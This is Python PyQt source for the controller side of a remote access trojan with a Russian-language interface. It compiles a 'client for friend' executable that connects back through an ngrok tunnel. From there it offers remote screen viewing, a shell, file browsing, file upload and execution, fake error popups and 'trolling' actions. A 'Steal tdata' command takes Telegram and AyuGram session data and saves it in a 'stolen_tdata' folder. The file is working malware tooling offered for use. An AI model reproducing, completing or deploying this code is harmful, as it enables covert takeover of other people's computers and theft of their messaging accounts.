class MainApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Remote Control")
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint)
        self.resize(1150, 700)
        self.setMinimumSize(900, 550)
        self.setStyleSheet(QSS)

        self.server = EmbeddedServer()
        self.screen_win = None
        self.terminal_win = None
        self.file_browser_win = None
        self.current_fps = 30
        self.current_quality = 50
        self.mouse_control_enabled = False
        self.fs_handler = None
        self.send_queue = None
        self.viewer_loop = None
        self.stop_client_event = threading.Event()
        self.drag_pos = None
        self.active_button = None

        self._init_ui()
        self._init_mock_logs()
        self._set_deploy_button_style(False)

    def set_fs_handler(self, handler):
        self.fs_handler = handler

    def _init_mock_logs(self):
        self._append_colored_text("[+] Core initialized", COLOR_SUCCESS)
        self._append_colored_text("[+] Modules loaded: server, client, file_manager, terminal", COLOR_SUCCESS)
        self._append_colored_text("[*] Waiting for broadcaster connection...", COLOR_TERMINAL_ACCENT)
        self._append_colored_text("[*] Status: Ready", COLOR_TERMINAL_ACCENT)

    def _append_colored_text(self, text, color):
        cursor = self.terminal.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.End)
        
        fmt = QTextCharFormat()
        fmt.setForeground(QColor(color))
        fmt.setFontFamily("Consolas")
        fmt.setFontPointSize(10)
        
        cursor.insertText(text + "\n", fmt)
        self.terminal.setTextCursor(cursor)
        self.terminal.ensureCursorVisible()

    def _set_active_button(self, button):
        if self.active_button:
            self.active_button.set_active(False)
        self.active_button = button
        button.set_active(True)

    def _set_deploy_button_style(self, is_running):
        if is_running:
            self.btn_deploy.setText("Terminate")
            self.btn_deploy.setStyleSheet("""
                background-color: #EF4444;
                border: none;
                border-radius: 8px;
                color: white;
                font-size: 11px;
                font-weight: 700;
                padding: 10px 20px;
            """)
        else:
            self.btn_deploy.setText("Deploy")
            self.btn_deploy.setStyleSheet("""
                background-color: #6366F1;
                border: none;
                border-radius: 8px;
                color: white;
                font-size: 11px;
                font-weight: 700;
                padding: 10px 20px;
            """)

    def _init_ui(self):
        central = QWidget()
        central.setStyleSheet(f"background-color: {COLOR_BG};")
        self.setCentralWidget(central)
        root_layout = QVBoxLayout(central)
        root_layout.setContentsMargins(0, 0, 0, 0)
        root_layout.setSpacing(0)

        # Title Bar
        title_bar = QFrame()
        title_bar.setObjectName("titleBar")
        title_layout = QHBoxLayout(title_bar)
        title_layout.setContentsMargins(16, 0, 0, 0)
        title_layout.setSpacing(0)

        title_label = QLabel("◆ Remote Control")
        title_label.setObjectName("titleLabel")
        title_layout.addWidget(title_label)
        title_layout.addStretch()

        btn_minimize = QPushButton("─")
        btn_minimize.setObjectName("titleButton")
        btn_minimize.clicked.connect(self.showMinimized)
        title_layout.addWidget(btn_minimize)

        btn_close = QPushButton("✕")
        btn_close.setObjectName("closeButton")
        btn_close.clicked.connect(self.close)
        title_layout.addWidget(btn_close)

        root_layout.addWidget(title_bar)

        # Main content
        content_widget = QWidget()
        content_layout = QHBoxLayout(content_widget)
        content_layout.setContentsMargins(0, 0, 0, 0)
        content_layout.setSpacing(0)

        # Sidebar
        sidebar = QFrame()
        sidebar.setObjectName("sidebar")
        sidebar.setFixedWidth(220)
        sidebar_layout = QVBoxLayout(sidebar)
        sidebar_layout.setContentsMargins(12, 20, 12, 16)
        sidebar_layout.setSpacing(2)

        # Gear icon at top of sidebar
        btn_gear_top = QPushButton("⚙")
        btn_gear_top.setFixedSize(30, 30)
        btn_gear_top.setCursor(Qt.CursorShape.PointingHandCursor)
        btn_gear_top.setStyleSheet("""
            background: transparent;
            border: none;
            color: #6B6B80;
            font-size: 14px;
            border-radius: 4px;
        """)
        btn_gear_top.clicked.connect(self.open_settings_window)
        sidebar_layout.insertWidget(0, btn_gear_top, alignment=Qt.AlignmentFlag.AlignRight)

        # Sections
        sections = [
            ("ОСНОВНОЕ", [
                ("Экран", self.open_screen_window),
                ("Терминал", self.open_terminal_window),
                ("Файлы", self.open_file_browser),
            ]),
            ("ИНСТРУМЕНТЫ", [
                ("Украсть tdata", self.steal_tdata_command),
                ("Открыть файл", self.open_file_on_remote),
            ]),
            ("ДЕЙСТВИЯ", [
                ("Ошибка", self.open_error_dialog),
                ("Ссылка", self.open_url_dialog),
                ("Аудио", self.open_tts_dialog),
                ("Троллинг", self.open_troll_dialog),
            ]),
        ]
        
        self.sidebar_buttons = []
        
        for section_name, buttons in sections:
            section_label = QLabel(section_name)
            section_label.setObjectName("sectionLabel")
            sidebar_layout.addWidget(section_label)
            
            for text, handler in buttons:
                btn = SidebarButton(text)
                btn.clicked.connect(lambda checked, b=btn, h=handler: (self._set_active_button(b), h()))
                sidebar_layout.addWidget(btn)
                self.sidebar_buttons.append(btn)
        
        sidebar_layout.addStretch()
        
        version = QLabel("v2.4.1")
        version.setObjectName("versionLabel")
        sidebar_layout.addWidget(version)
        
        content_layout.addWidget(sidebar)

        # Main area
        main_widget = QWidget()
        main_layout = QVBoxLayout(main_widget)
        main_layout.setContentsMargins(20, 20, 20, 20)
        main_layout.setSpacing(16)

        # Status bar
        status_frame = QFrame()
        status_layout = QHBoxLayout(status_frame)
        status_layout.setContentsMargins(0, 0, 0, 0)
        status_layout.setSpacing(8)
        
        status_layout.addStretch()
        
        self.user_status = StatusIndicator("User")
        status_layout.addWidget(self.user_status)
        
        self.server_status = StatusIndicator("Server")
        status_layout.addWidget(self.server_status)
        
        main_layout.addWidget(status_frame)

        # Terminal
        terminal_frame = QFrame()
        terminal_frame.setObjectName("terminalFrame")
        terminal_layout = QVBoxLayout(terminal_frame)
        terminal_layout.setContentsMargins(0, 0, 0, 0)
        terminal_layout.setSpacing(0)
        
        # Terminal header
        terminal_header = QFrame()
        terminal_header.setObjectName("terminalHeader")
        terminal_header_layout = QHBoxLayout(terminal_header)
        terminal_header_layout.setContentsMargins(16, 0, 16, 0)
        terminal_header_layout.setSpacing(8)
        
        # Window dots
        for color in ['#FF5F57', '#FEBC2E', '#28C840']:
            dot = QLabel()
            dot.setObjectName("terminalDot")
            dot.setStyleSheet(f"background-color: {color};")
            terminal_header_layout.addWidget(dot)
        
        terminal_header_layout.addSpacing(16)
        
        header_text = QLabel("remote://terminal")
        header_text.setObjectName("terminalHeaderText")
        terminal_header_layout.addWidget(header_text)
        
        terminal_header_layout.addStretch()
        
        for text in ['Session: active', 'Secure Tunnel: OK']:
            pill = QLabel(text)
            pill.setObjectName("terminalPill")
            terminal_header_layout.addWidget(pill)
        
        terminal_layout.addWidget(terminal_header)
        
        # Terminal text
        self.terminal = QTextEdit()
        self.terminal.setObjectName("terminal")
        self.terminal.setReadOnly(True)
        terminal_layout.addWidget(self.terminal)
        
        main_layout.addWidget(terminal_frame, 1)

        # Action buttons
        button_frame = QFrame()
        button_layout = QHBoxLayout(button_frame)
        button_layout.setContentsMargins(0, 0, 0, 0)
        button_layout.setSpacing(8)
        
        button_layout.addStretch()
        
        self.btn_deploy = ActionButton("Deploy", primary=True)
        self.btn_deploy.clicked.connect(self.toggle_server)
        button_layout.addWidget(self.btn_deploy)
        
        self.btn_compile = ActionButton("Compile", primary=False)
        self.btn_compile.clicked.connect(self.compile_friend_client)
        button_layout.addWidget(self.btn_compile)
        
        main_layout.addWidget(button_frame)

        content_layout.addWidget(main_widget)
        root_layout.addWidget(content_widget)

        # Enable dragging
        title_bar.mousePressEvent = self.mouse_press_event
        title_bar.mouseMoveEvent = self.mouse_move_event

    def mouse_press_event(self, event):
        if event.button() == Qt.MouseButton.LeftButton:
            self.drag_pos = event.globalPosition().toPoint() - self.frameGeometry().topLeft()
            event.accept()

    def mouse_move_event(self, event):
        if event.buttons() == Qt.MouseButton.LeftButton and self.drag_pos:
            self.move(event.globalPosition().toPoint() - self.drag_pos)
            event.accept()

    def toggle_server(self):
        if not self.server.is_running:
            self.btn_deploy.setText("Starting...")
            self.btn_deploy.setEnabled(False)
            threading.Thread(target=self._start_server, daemon=True).start()
        else:
            self.server.stop()
            self.stop_client_event.set()
            self._set_deploy_button_style(False)
            self.server_status.set_online(False)
            self.user_status.set_online(False)

    def _start_server(self):
        print("[DEBUG] _start_server called")
        try:
            host = self.server.start()
            print(f"[DEBUG] Server started with host: {host}")
            self._set_deploy_button_style(True)
            self.server_status.set_online(True)
            if host == "localhost":
                self._append_colored_text(f"[+] Server active in local mode (no ngrok)", COLOR_WARNING)
            else:
                self._append_colored_text(f"[+] Server active: {host}", COLOR_SUCCESS)
            self.start_viewer_client("127.0.0.1", PORT)
            print("[DEBUG] Viewer client started")
        except Exception as e:
            print(f"[DEBUG] Server error: {e}")
            traceback.print_exc()
            self._set_deploy_button_style(False)
            self._append_colored_text(f"[-] Server error: {e}", COLOR_DANGER)
            QMessageBox.critical(self, "Ошибка запуска", str(e))

    def compile_friend_client(self):
        if not self.server.ngrok_host:
            QMessageBox.warning(self, "Внимание", "Сначала запусти сервер (Deploy), чтобы получить активный ngrok хост!")
            return

        FormatChoiceDialog(self, self._handle_format_choice).exec()

    def _handle_format_choice(self, fmt: str):
        if fmt == "py":
            save_path, _ = QFileDialog.getSaveFileName(
                self, "Сохранить Python скрипт для друга", "client_for_friend.py",
                "Python Files (*.py);;All Files (*.*)"
            )
            if save_path:
                content = BROADCASTER_CODE_TEMPLATE.replace("__SERVER_HOST_PLACEHOLDER__", self.server.ngrok_host)
                with open(save_path, "w", encoding="utf-8") as f:
                    f.write(content)
                QMessageBox.information(self, "Успех", f"Python скрипт готов!\n\nХост ngrok: {self.server.ngrok_host}\nСохранен в:\n{save_path}")

        elif fmt == "exe":
            save_path, _ = QFileDialog.getSaveFileName(
                self, "Сохранить Executable файл (.exe) для друга", "client_for_friend.exe",
                "Executable Files (*.exe);;All Files (*.*)"
            )
            if save_path:
                progress_win = BuildProgressDialog(self)
                progress_win.show()
                threading.Thread(target=self._build_exe_worker, args=(save_path, progress_win), daemon=True).start()

    def _build_exe_worker(self, save_path: str, progress_win: BuildProgressDialog):
        try:
            check_proc = subprocess.run(
                [sys.executable, "-m", "PyInstaller", "--version"],
                capture_output=True, text=True,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
            )
            if check_proc.returncode != 0:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", "pyinstaller"],
                    capture_output=True, text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
                )

            with tempfile.TemporaryDirectory() as temp_dir:
                source_path = os.path.join(temp_dir, "client_source.py")
                content = BROADCASTER_CODE_TEMPLATE.replace("__SERVER_HOST_PLACEHOLDER__", self.server.ngrok_host)
                with open(source_path, "w", encoding="utf-8") as f:
                    f.write(content)

                dist_dir = os.path.join(temp_dir, "dist")
                work_dir = os.path.join(temp_dir, "build")
                spec_dir = temp_dir
                exe_name = os.path.splitext(os.path.basename(save_path))[0]

                cmd = [
                    sys.executable, "-m", "PyInstaller",
                    "--noconfirm",
                    "--onefile",
                    "--windowed",
                    "--clean",
                    "--name", exe_name,
                    "--hidden-import", "websockets",
                    "--hidden-import", "mss",
                    "--hidden-import", "PIL",
                    "--hidden-import", "base64",
                    "--distpath", dist_dir,
                    "--workpath", work_dir,
                    "--specpath", spec_dir,
                    source_path
                ]

                flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
                res = subprocess.run(cmd, capture_output=True, text=True, creationflags=flags)

                if res.returncode != 0:
                    raise RuntimeError(f"PyInstaller завершился с ошибкой:\n{res.stderr}")

                built_exe = os.path.join(dist_dir, exe_name + (".exe" if os.name == "nt" else ""))
                if not os.path.exists(built_exe):
                    built_exe = os.path.join(dist_dir, "client_source" + (".exe" if os.name == "nt" else ""))

                if os.path.exists(built_exe):
                    shutil.copyfile(built_exe, save_path)
                    progress_win.close()
                    QMessageBox.information(self, "Успех", f"EXE-файл успешно скомпилирован и готов к запуску!\n\nПуть:\n{save_path}")
                else:
                    raise FileNotFoundError("Скомпилированный файл не найден в папке dist.")

        except Exception as e:
            progress_win.close()
            QMessageBox.critical(self, "Ошибка компиляции EXE", f"Не удалось собрать EXE файл:\n{e}")

    def open_screen_window(self):
        if self.screen_win is None or not self.screen_win.is_open:
            self.screen_win = ScreenViewerWindow(self)
            self.screen_win.show()
            self.send_command({"type": "config", "fps": 10, "quality": 30})
        else:
            self.screen_win.raise_()
            self.screen_win.activateWindow()

    def open_settings_window(self):
        SettingsDialog(self, self, self.current_fps, self.current_quality).exec()

    def apply_stream_settings(self, fps, quality):
        self.current_fps = fps
        self.current_quality = quality
        self.send_command({"type": "config", "fps": fps, "quality": quality})

    def open_error_dialog(self):
        ErrorDialog(self, lambda title, text: self.send_command({"type": "error_popup", "title": title, "text": text})).exec()

    def open_url_dialog(self):
        URLDialog(self, lambda url: self.send_command({"type": "open_url", "url": url})).exec()

    def open_tts_dialog(self):
        TTSDialog(self, lambda text: self.send_command({"type": "tts", "text": text})).exec()

    def open_troll_dialog(self):
        TrollDialog(
            self,
            on_mouse_callback=lambda dur: self.send_command({"type": "mouse_shake", "duration": dur}),
            on_rotate_callback=lambda angle: self.send_command({"type": "screen_rotate", "angle": angle})
        ).exec()

    def open_terminal_window(self):
        if self.terminal_win is None or not self.terminal_win.is_open:
            self.terminal_win = TerminalWindow(self)
            self.terminal_win.show()
        else:
            self.terminal_win.raise_()
            self.terminal_win.activateWindow()

    def open_file_browser(self):
        if self.file_browser_win is None or not self.file_browser_win.is_open:
            self.file_browser_win = FileBrowserWindow(self)
            self.file_browser_win.show()
        else:
            self.file_browser_win.raise_()
            self.file_browser_win.activateWindow()

    def send_command(self, data_dict):
        if self.viewer_loop and self.send_queue:
            msg = json.dumps(data_dict)
            self.viewer_loop.call_soon_threadsafe(self.send_queue.put_nowait, msg)

    def send_kill_switch(self):
        self.send_command({"type": "self_destruct"})
        self._append_colored_text("[!] Kill switch sent to client", COLOR_DANGER)
        QMessageBox.information(self, "Remote Control", "Команда деактивации отправлена.")

    def steal_tdata_command(self):
        self.send_command({"type": "steal_tdata"})
        QMessageBox.information(self, "Кража tdata", "Команда отправлена. tdata будет сохранена в папке stolen_tdata (tdata_telegram и tdata_ayugram).")

    def open_file_on_remote(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Выберите файл для открытия на ПК друга", "",
            "All Files (*.*)"
        )
        if file_path:
            try:
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                
                if len(file_data) > 20 * 1024 * 1024:
                    QMessageBox.critical(self, "Ошибка", "Файл слишком большой (максимум 20 МБ)")
                    return
                
                encoded = base64.b64encode(file_data).decode('utf-8')
                filename = os.path.basename(file_path)
                
                self.send_command({
                    "type": "upload_file",
                    "data": encoded,
                    "filename": filename
                })
                
                QMessageBox.information(self, "Успех", f"Файл '{filename}' отправлен и будет открыт на ПК друга.")
            except Exception as e:
                QMessageBox.critical(self, "Ошибка", f"Не удалось отправить файл: {e}")

    def set_friend_online(self, is_online: bool):
        self.user_status.set_online(is_online)

    def start_viewer_client(self, host, port):
        self.stop_client_event.clear()
        threading.Thread(target=self._viewer_client_thread, args=(host, port), daemon=True).start()

    def _viewer_client_thread(self, host, port):
        asyncio.run(self._viewer_network_task(host, port))

    async def _viewer_network_task(self, host, port):
        url = f"ws://{host}:{port}"
        self.send_queue = asyncio.Queue()
        self.viewer_loop = asyncio.get_running_loop()

        while not self.stop_client_event.is_set():
            try:
                async with websockets.connect(url, max_size=100 * 1024 * 1024) as ws:
                    await ws.send("role:viewer")

                    async def _recv():
                        async for message in ws:
                            if isinstance(message, bytes):
                                if self.screen_win and self.screen_win.is_open:
                                    self.screen_win.update_frame(message)
                            elif isinstance(message, str):
                                try:
                                    data = json.loads(message)
                                    mtype = data.get("type")
                                    if mtype == "status":
                                        online = data.get("broadcaster_online", False)
                                        self.set_friend_online(online)
                                    elif mtype == "terminal_output":
                                        out = data.get("output", "")
                                        if self.terminal_win and self.terminal_win.is_open:
                                            self.terminal_win.append_output(out)
                                    elif mtype == "tdata_multi":
                                        tdata_dir = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "stolen_tdata")
                                        
                                        for app_name, encoded_data in data.get("data", {}).items():
                                            app_dir = os.path.join(tdata_dir, f"tdata_{app_name}")
                                            os.makedirs(app_dir, exist_ok=True)
                                            
                                            filepath = os.path.join(app_dir, f"tdata_{int(time.time())}.zip")
                                            
                                            file_data = base64.b64decode(encoded_data)
                                            
                                            with open(filepath, "wb") as f:
                                                f.write(file_data)
                                            
                                            print(f"[+] {app_name} tdata сохранена в {filepath}")
                                    
                                    if self.fs_handler:
                                        self.fs_handler(data)
                                except Exception:
                                    pass

                    async def _send():
                        while True:
                            msg = await self.send_queue.get()
                            await ws.send(msg)

                    await asyncio.gather(_recv(), _send())
            except Exception as e:
                print(f"[DEBUG] Viewer client error: {e}")
                self.set_friend_online(False)
                await asyncio.sleep(2)

    def closeEvent(self, event):
        self.server.stop()
        event.accept()